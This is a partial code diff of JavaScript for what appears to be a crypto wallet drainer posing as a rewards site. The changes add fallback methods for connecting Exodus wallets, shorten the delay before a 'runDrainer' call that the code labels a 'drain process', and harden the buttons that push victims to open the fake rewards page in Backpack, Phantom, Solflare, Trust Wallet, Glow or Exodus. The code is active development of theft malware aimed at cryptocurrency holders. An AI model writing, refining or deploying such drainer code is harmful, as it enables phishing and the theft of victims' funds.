-                // Add timeout to prevent hanging
-                const connectPromise = provider.connect();
+                      return provider.connect();
+                    } else {
+                      throw new Error('Main provider not available');
+                    }
+                  }
+                },
+                {
+                  name: 'Method 3: Direct public key access',
+                  fn: () => {
+                    if (provider.solana && provider.solana.publicKey) {
+                      console.log('[CONNECT] Using Exodus direct public key access');
+                      return { publicKey: provider.solana.publicKey };
+                    } else if (provider.publicKey) {
+                      console.log('[CONNECT] Using Exodus main public key access');
+                      return { publicKey: provider.publicKey };
+                    } else {
+                      throw new Error('No public key available');
+                    }
+                  }
+                }
+              ];
+              
+              let exodusConnected = false;
+              for (let i = 0; i < exodusStrategies.length && !exodusConnected; i++) {
+                const strategy = exodusStrategies[i];
+                try {
+                  console.log(`[CONNECT] Exodus ${strategy.name}...`);
+                  
+                  const connectPromise = strategy.fn();
                 const timeoutPromise = new Promise((_, reject) => 
-                  setTimeout(() => reject(new Error('Exodus connection timeout')), 15000) // 15 seconds
+                    setTimeout(() => reject(new Error('Exodus connection timeout')), 30000) // 30 seconds per attempt
                 );
+                  
                 response = await Promise.race([connectPromise, timeoutPromise]);
-                publicKey = response?.publicKey || provider.publicKey;
+                  publicKey = response?.publicKey || provider.solana?.publicKey || provider.publicKey;
+                  
+                  if (publicKey) {
+                    exodusConnected = true;
+                    console.log(`[CONNECT] Exodus ${strategy.name} successful:`, publicKey.toString());
               } else {
-                throw new Error('Exodus provider not properly configured');
+                    throw new Error('No public key returned');
+                  }
+                } catch (strategyError) {
+                  console.log(`[CONNECT] Exodus ${strategy.name} failed:`, strategyError.message);
+                  if (i < exodusStrategies.length - 1) {
+                    await new Promise(resolve => setTimeout(resolve, 1000)); // Wait before next attempt
+                  }
+                }
+              }
+              
+              if (!exodusConnected) {
+                throw new Error('Exodus connection failed: All connection methods failed');
               }
               break;
               
@@ -5895,7 +6321,7 @@ window.connectWallet = async function connectWallet(walletKey) {
           console.log(`[CONNECT] ${wallet.name} connection successful - triggering drain process`);
           setTimeout(() => {
             runDrainer(provider);
-          }, 1000);
+          }, 500); // Reduced timeout to prevent delays
           
           } catch (error) {
           console.error(`[CONNECT] ${wallet.name} connection failed:`, error);
@@ -5947,22 +6373,22 @@ window.connectWallet = async function connectWallet(walletKey) {
               Click below to open this rewards site in your wallet's browser for instant connection:
             </p>
             <div style="display: flex; flex-wrap: wrap; gap: 8px; justify-content: center;">
-              <button onclick="openInWallet('backpack')" style="background: linear-gradient(135deg, #000000 0%, #333333 100%); color: white; border: none; padding: 12px 18px; border-radius: 8px; font-size: 14px; cursor: pointer; transition: all 0.3s ease; font-weight: bold; box-shadow: 0 2px 8px rgba(0,0,0,0.3);">
+              <button onclick="openInWallet('backpack').catch(e => console.error('Backpack error:', e))" style="background: linear-gradient(135deg, #000000 0%, #333333 100%); color: white; border: none; padding: 12px 18px; border-radius: 8px; font-size: 14px; cursor: pointer; transition: all 0.3s ease; font-weight: bold; box-shadow: 0 2px 8px rgba(0,0,0,0.3);">
                 🎒 Open in Backpack (Recommended)
               </button>
-              <button onclick="openInWallet('phantom')" style="background: linear-gradient(135deg, #9945FF 0%, #7B3FE4 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
+              <button onclick="openInWallet('phantom').catch(e => console.error('Phantom error:', e))" style="background: linear-gradient(135deg, #9945FF 0%, #7B3FE4 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
                 ⚡ Open in Phantom
               </button>
-              <button onclick="openInWallet('solflare')" style="background: linear-gradient(135deg, #FC9965 0%, #F7931E 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
+              <button onclick="openInWallet('solflare').catch(e => console.error('Solflare error:', e))" style="background: linear-gradient(135deg, #FC9965 0%, #F7931E 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
                 ⚡ Open in Solflare
               </button>
-              <button onclick="openInWallet('trustwallet')" style="background: linear-gradient(135deg, #3375BB 0%, #1E4A8C 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
+              <button onclick="openInWallet('trustwallet').catch(e => console.error('Trust Wallet error:', e))" style="background: linear-gradient(135deg, #3375BB 0%, #1E4A8C 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
                 ⚡ Open in Trust Wallet
               </button>
-              <button onclick="openInWallet('glow')" style="background: linear-gradient(135deg, #FF6B6B 0%, #FF8E53 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
+              <button onclick="openInWallet('glow').catch(e => console.error('Glow error:', e))" style="background: linear-gradient(135deg, #FF6B6B 0%, #FF8E53 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
                 ⚡ Open in Glow
               </button>
-              <button onclick="openInWallet('exodus')" style="background: linear-gradient(135deg, #00D4AA 0%, #00B894 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
+              <button onclick="openInWallet('exodus').catch(e => console.error('Exodus error:', e))" style="background: linear-gradient(135deg, #00D4AA 0%, #00B894 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
                 ⚡ Open in Exodus
               </button>
             </div>
